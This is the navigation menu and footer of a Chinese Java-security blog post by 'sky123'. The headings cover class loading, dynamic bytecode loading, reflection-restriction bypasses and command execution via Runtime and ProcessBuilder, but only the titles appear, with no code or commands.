href="#%E9%93%BE%E6%8E%A5%EF%BC%88Linking%EF%BC%89"><span class="nav-text">链接（Linking）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%EF%BC%88Verification%EF%BC%89"><span class="nav-text">验证（Verification）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%86%E5%A4%87%EF%BC%88Preparation%EF%BC%89"><span class="nav-text">准备（Preparation）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%EF%BC%88Resolution%EF%BC%89"><span class="nav-text">解析（Resolution）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%EF%BC%88Initialization%EF%BC%89"><span class="nav-text">初始化（Initialization）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E5%88%9D%E5%A7%8B%E5%8C%96%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84"><span class="nav-text">类初始化相关结构</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#static-%E5%8F%98%E9%87%8F"><span class="nav-text">static 变量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#static-final-%E5%8F%98%E9%87%8F"><span class="nav-text">static final 变量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%9D%97-static"><span class="nav-text">静态代码块 static { ... }</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E5%88%9D%E5%A7%8B%E5%8C%96%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="nav-text">类初始化的操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91%E7%B1%BB%E5%88%9D%E5%A7%8B%E5%8C%96%E7%9A%84%E4%BA%8B%E4%BB%B6"><span class="nav-text">触发类初始化的事件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%96%B9%E5%BC%8F"><span class="nav-text">类加载方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%98%BE%E5%BC%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD%EF%BC%88Explicit-Class-Loading%EF%BC%89"><span class="nav-text">显式类加载（Explicit Class Loading）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%8A%A0%E8%BD%BD"><span class="nav-text">通过反射机制加载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8A%A0%E8%BD%BD"><span class="nav-text">通过类加载器加载</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%90%E5%BC%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD%EF%BC%88Implicit-Class-Loading%EF%BC%89"><span class="nav-text">隐式类加载（Implicit Class Loading）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1%E5%8A%A0%E8%BD%BD"><span class="nav-text">通过实例化对象加载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E7%9A%84%E9%A6%96%E6%AC%A1%E2%80%9C%E4%B8%BB%E5%8A%A8%E4%BD%BF%E7%94%A8%E2%80%9D"><span class="nav-text">类的首次“主动使用”</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="nav-text">类加载器</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="nav-text">类加载器的类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%95%E5%AF%BC%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88Bootstrap-ClassLoader%EF%BC%89"><span class="nav-text">引导类加载器（Bootstrap ClassLoader）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A9%E5%B1%95%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88Extension-ClassLoader%EF%BC%89"><span class="nav-text">扩展类加载器（Extension ClassLoader）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88System-ClassLoader%EF%BC%89"><span class="nav-text">系统类加载器（System ClassLoader）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88Custom-ClassLoader%EF%BC%89"><span class="nav-text">自定义类加载器（Custom ClassLoader）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="nav-text">类加载器的获取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%B1%BB%E7%9A%84%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="nav-text">获取当前类的类加载器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%BA%BF%E7%A8%8B%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="nav-text">获取当前线程的上下文类加载器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="nav-text">获取系统类加载器</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95"><span class="nav-text">类加载器常见方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#loadClass%EF%BC%88%E5%8A%A0%E8%BD%BD%E6%8C%87%E5%AE%9A%E7%9A%84-Java-%E7%B1%BB%EF%BC%89"><span class="nav-text">loadClass（加载指定的 Java 类）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#findClass%EF%BC%88%E6%9F%A5%E6%89%BE%E6%8C%87%E5%AE%9A%E7%9A%84-Java-%E7%B1%BB%EF%BC%89"><span class="nav-text">findClass（查找指定的 Java 类）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#findLoadedClass%EF%BC%88%E6%9F%A5%E6%89%BE-JVM-%E5%B7%B2%E7%BB%8F%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%9A%84%E7%B1%BB%EF%BC%89"><span class="nav-text">findLoadedClass（查找 JVM 已经加载过的类）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#resolveClass%EF%BC%88%E9%93%BE%E6%8E%A5%E6%8C%87%E5%AE%9A%E7%9A%84-Java-%E7%B1%BB%EF%BC%89"><span class="nav-text">resolveClass（链接指定的 Java 类）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B%EF%BC%88Parent-Delegation-Model%EF%BC%89"><span class="nav-text">双亲委派模型（Parent Delegation Model）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84"><span class="nav-text">类加载器层次结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0"><span class="nav-text">双亲委派模型具体实现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E4%B8%8E%E7%B1%BB%E7%9A%84%E9%9A%94%E7%A6%BB%E6%80%A7"><span class="nav-text">类加载器与类的隔离性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="nav-text">类命名空间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%9A%84%E9%9A%94%E7%A6%BB%E6%80%A7"><span class="nav-text">类加载的隔离性</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">动态加载字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#defineClass"><span class="nav-text">defineClass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#URLClassLoader"><span class="nav-text">URLClassLoader</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TemplatesImpl"><span class="nav-text">TemplatesImpl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BCEL-ClassLoader"><span class="nav-text">BCEL ClassLoader</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SPI%EF%BC%88Service-Provider-Interface%EF%BC%89"><span class="nav-text">SPI（Service Provider Interface）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JS-%E5%BC%95%E6%93%8E%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">JS 引擎加载字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JDK8-%E4%BB%BB%E6%84%8F%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A0%E8%BD%BD"><span class="nav-text">JDK8 任意字节码加载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JDK6-7-Rhino%E4%B8%8B%E8%B0%83%E7%94%A8defineClass"><span class="nav-text">JDK6&#x2F;7 Rhino下调用defineClass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JDK9-10-11-%E7%BB%95%E8%BF%87%E6%A8%A1%E5%9D%97%E9%9A%94%E7%A6%BB%E5%BC%BA%E8%A1%8C%E5%8F%8D%E5%B0%84%E6%96%B9%E6%B3%95"><span class="nav-text">JDK9&#x2F;10&#x2F;11 绕过模块隔离强行反射方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JDK12-13-14%E7%BB%95%E8%BF%87fieldFilterMap"><span class="nav-text">JDK12&#x2F;13&#x2F;14绕过fieldFilterMap</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%AE%E7%A9%BA-fieldFilterMap"><span class="nav-text">置空 fieldFilterMap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-Unsafe-defineAnonymousClass-%E4%BB%A3%E6%9B%BF"><span class="nav-text">使用 Unsafe#defineAnonymousClass 代替</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84"><span class="nav-text">反射</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-Class-%E5%AE%9E%E4%BE%8B"><span class="nav-text">获取 Class 实例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E7%B1%BB%E5%90%8D%E8%8E%B7%E5%8F%96"><span class="nav-text">通过类名获取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%AF%B9%E8%B1%A1%E8%8E%B7%E5%8F%96"><span class="nav-text">通过对象获取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E7%B1%BB%E8%8E%B7%E5%8F%96"><span class="nav-text">通过类获取</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%AD%97%E6%AE%B5"><span class="nav-text">操作字段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5"><span class="nav-text">获取字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="nav-text">获取字段值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="nav-text">设置字段值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9-final-%E5%8F%98%E9%87%8F"><span class="nav-text">修改 final 变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95"><span class="nav-text">操作方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%96%B9%E6%B3%95"><span class="nav-text">获取方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-text">调用方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="nav-text">操作构造函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="nav-text">获取构造函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1"><span class="nav-text">创建对象</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unsafe-%E7%B1%BB"><span class="nav-text">Unsafe 类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-Unsafe-%E5%AE%9E%E4%BE%8B"><span class="nav-text">获取 Unsafe 实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E7%9A%84%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-text">获取字段的偏移量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E5%AD%97%E6%AE%B5%E7%9A%84%E8%AF%BB%E5%86%99"><span class="nav-text">对象字段的读写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC-JDK-%E5%8F%8D%E5%B0%84%E7%BB%95%E8%BF%87"><span class="nav-text">高版本 JDK 反射绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#9%E2%89%A4JDK"><span class="nav-text">9≤JDK&lt;12 (setAccessible)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%E5%8C%96%E7%B3%BB%E7%BB%9F"><span class="nav-text">模块化系统</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-text">限制条件分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E8%AE%BF%E9%97%AE%E5%B1%9E%E6%80%A7"><span class="nav-text">修改访问属性</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12%E2%89%A4JDK"><span class="nav-text">12≤JDK&lt;17 (getDeclaredField)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90-1"><span class="nav-text">限制条件分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B0%83%E7%94%A8-getDeclaredFields0-%E5%87%BD%E6%95%B0"><span class="nav-text">调用 getDeclaredFields0 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BD%AE%E7%A9%BA-fieldFilterMap-1"><span class="nav-text">置空 fieldFilterMap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JDK-%E2%89%A5-17-setAccessible"><span class="nav-text">JDK ≥ 17 (setAccessible)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90-2"><span class="nav-text">限制条件分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-2"><span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9-module-%E5%B1%9E%E6%80%A7"><span class="nav-text">修改 module 属性</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%90%86"><span class="nav-text">代理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-text">静态代理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="nav-text">静态代理的概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="nav-text">静态代理的实现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-text">动态代理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="nav-text">动态代理的概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-text">基于接口的动态代理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-text">代码实现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-text">原理分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%EF%BC%88CGLIB%EF%BC%89"><span class="nav-text">基于类的动态代理（CGLIB）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">反射执行命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#getRuntime"><span class="nav-text">getRuntime</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ProcessBuilder"><span class="nav-text">ProcessBuilder</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        57 posts in total
                    </span>
                    
                        <span>
                            1212.2k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>